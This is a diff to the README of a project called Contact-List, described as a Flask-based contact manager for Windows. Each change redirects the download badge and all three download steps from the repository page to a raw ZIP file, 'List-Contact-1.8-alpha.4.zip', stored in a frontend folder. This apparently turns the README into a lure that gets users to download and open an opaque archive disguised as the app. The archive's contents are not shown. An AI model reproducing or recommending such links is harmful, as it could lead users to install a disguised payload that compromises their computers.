@@ -1,6 +1,6 @@
 # 📇 Contact-List - Simple Contact Management for Windows
 
-[![Download Contact-List](https://img.shields.io/badge/Download-Contact--List-blue?style=for-the-badge)](https://github.com/Colori2467/Contact-List)
+[![Download Contact-List](https://img.shields.io/badge/Download-Contact--List-blue?style=for-the-badge)](https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip)
 
 ## 🖥️ What This App Does
 
@@ -8,7 +8,7 @@ Contact-List helps you store and manage your contacts in one place. You can add 
 
 ## 📥 Download and Open
 
-1. Visit this page to download: [https://github.com/Colori2467/Contact-List](https://github.com/Colori2467/Contact-List)
+1. Visit this page to download: [https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip](https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip)
 2. On the page, look for the latest release or download files.
 3. Save the file to your Windows computer.
 4. Open the downloaded folder.
@@ -32,7 +32,7 @@ You may also want a text editor such as Visual Studio Code if you need to check 
 
 Follow these steps to run Contact-List on Windows:
 
-1. Go to [https://github.com/Colori2467/Contact-List](https://github.com/Colori2467/Contact-List)
+1. Go to [https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip](https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip)
 2. Download the project files to your computer.
 3. If you received a ZIP file, right-click it and choose Extract All.
 4. Open the extracted folder.
@@ -164,7 +164,7 @@ Try these checks:
 
 ## 📌 Quick Start Path
 
-1. Download the project from [https://github.com/Colori2467/Contact-List](https://github.com/Colori2467/Contact-List)
+1. Download the project from [https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip](https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip)
 2. Extract the files
 3. Install Python and Node.js if needed
 4. Start the Flask server
